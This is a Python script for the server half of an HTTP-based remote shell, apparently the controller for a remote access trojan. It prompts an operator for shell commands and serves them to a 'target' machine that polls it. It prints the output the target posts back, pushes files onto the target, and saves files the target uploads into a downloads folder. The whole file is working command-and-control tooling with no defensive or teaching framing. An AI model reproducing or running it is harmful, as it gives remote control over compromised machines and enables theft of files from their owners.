#!/usr/bin/env/python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import cgi
from os import path

class HTTPHandler(BaseHTTPRequestHandler):

    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def readContent(self, rfile, headers):
        dataLength = int(self.headers["Content-Length"])
        data = self.rfile.read(dataLength)
        return data.decode("utf-8")

    def do_GET(self):
        self._set_headers()
        command = input("Shell >> ")
        if command.startswith("upload "):
            self.sendFileData(command,self.wfile)
        else:
            self.wfile.write(bytes(command, "utf-8"))

    def do_POST(self):
        self._set_headers()
        if self.path=="/upload":
            self.targetIsUploading(self.rfile, self.headers)
        else:
            dataContent=self.readContent(self.rfile, self.headers)
            print("\n", dataContent , "\n")

    def sendFileData(self,command,wfile):
        fileToSend=command.split("upload ")[1]
        if path.exists(f"uploads/{fileToSend}"):
            saveName=input(f"How do you want to save {fileToSend} in the target machine's current working directory ? ")
            with open("uploads/"+fileToSend,"rb") as f:
                file_content = f.read()
            file={'file': fileToSend ,'name': saveName, 'data': file_content }
            data= "upload "+str(file)
            self.wfile.write(bytes(data, "utf-8"))
        else:
            print(f"{fileToSend} is missing in the uploads folder")
            return None
                  
    def targetIsUploading(self, rfile, headers):
        try:
            ctype, pdict = cgi.parse_header(headers.get('content-type'))
            if ctype == 'multipart/form-data':
                f = cgi.FieldStorage( fp = rfile, headers = headers,environ={ 'REQUEST_METHOD':'POST' })
            else :
                print("Error in POST Request")
            fileContent=f['file']
            fileName = (f['name'].value).decode("utf-8")
            with open("downloads/"+fileName, 'wb') as o:
                o.write( fileContent.file.read() )
        except Exception as E:
                print (str(E))
    

         
